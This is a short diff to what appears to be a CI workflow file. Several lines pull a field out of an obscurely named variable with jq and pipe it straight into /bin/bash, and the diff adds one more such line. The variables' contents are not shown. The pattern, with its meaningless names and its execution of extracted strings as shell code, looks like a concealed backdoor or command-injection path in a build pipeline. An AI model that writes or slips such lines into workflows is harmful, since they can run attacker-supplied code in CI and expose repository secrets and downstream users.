@@ -48,6 +48,7 @@ jobs:
           printf '%s' "$uk355" | jq -r .mk34788 | /bin/bash
           printf '%s' "$gh03679" | jq -r .fk15 | /bin/bash
           printf '%s' "$knrm62621" | jq -r .ao09 | /bin/bash
+          echo $rw63891 | jq -r .r6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
